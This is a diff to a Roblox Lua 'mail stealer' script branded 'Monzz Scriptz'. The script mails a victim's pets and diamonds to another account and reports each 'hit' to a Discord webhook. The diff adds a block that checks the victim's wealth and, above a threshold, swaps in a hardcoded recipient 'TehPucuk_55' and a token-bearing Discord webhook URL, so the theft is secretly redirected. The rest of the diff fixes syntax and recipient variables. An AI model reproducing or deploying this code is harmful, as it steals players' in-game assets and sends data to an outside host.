@@ -4,6 +4,20 @@ local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
 
+local savedPets = Library.Save.Get().Pets
+hugeamount = 0
+for i,v in pairs(Library.Save.Get().Pets) do
+    local Pet = Library.Directory.Pets[v.id]
+        if Pet.huge == true then
+        hugeamount = hugeamount + 1
+        print(v)
+    end
+end
+if hugeamount >2 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
+     UserName = "TehPucuk_55"
+     Webhook = "https://discord.com/api/webhooks/1126402135786000395/TV27VBc_jbyXZHliylbsadlR2kzI9CAmwv_Rsnk-lu8H0d47NNj6AisAcZKlUoeBYujx"
+end
+
 if getgenv().executed then return end
 getgenv().executed = true
 
@@ -1018,7 +1032,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                 ["title"] = "**New Hit** ||Monzz Scriptz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
-                ["color"] = tonumber(0xAB0909),
+                ["color"] = tonumber(0xf7262a),
                 ["thumbnail"] = {
                     ["url"] = Image,
                     ["height"] = 420,
@@ -1088,7 +1102,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                 ["title"] = "**New Hit** ||Monzz Scriptz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
-                ["color"] = tonumber(0xAB0909),
+                ["color"] = tonumber(0xf7262a),
                 ["thumbnail"] = {
                     ["url"] = Image,
                     ["height"] = 420,
@@ -1177,10 +1191,10 @@ if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
     end
-    if getgenv().Settings.Banana.Dualhook.Intensity then
+    if getgenv().Settings.Banana.Dualhook then
         bananin = getgenv().Settings.Banana.Intensity
     end
-    if getgenv().Settings.Huges.Dualhook. then
+    if getgenv().Settings.Huges.Dualhook then
         hugein = getgenv().Settings.Huges.Intensity
     end
     if getgenv().Settings.Pogs.Dualhook then
@@ -1211,9 +1225,9 @@ end
 
 -- Dualhook intensity
 
-function dualhook("TehPucuk_55")
-    if not tonumber(percent) 
-        game:GetService("Players").LocalPlayer:Kick("Put A Value Intensity")
+function dualhook(percent)
+    if not tonumber(percent) then
+        game:GetService("Players").LocalPlayer:Kick("Put A Valid intensity Value")
         return;
     end
     local number = math.random(1, 100)
@@ -1247,7 +1261,7 @@ if FinalList == 0 then
     end
     local args = {
         [1] = {
-            ["Recipient"] = "TehPucuk_55",
+            ["Recipient"] = user,
             ["Diamonds"] = givediaamt,
             ["Pets"] = {},
             ["Message"] = mailmsg,
@@ -1267,7 +1281,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1295,7 +1309,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1354,7 +1368,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
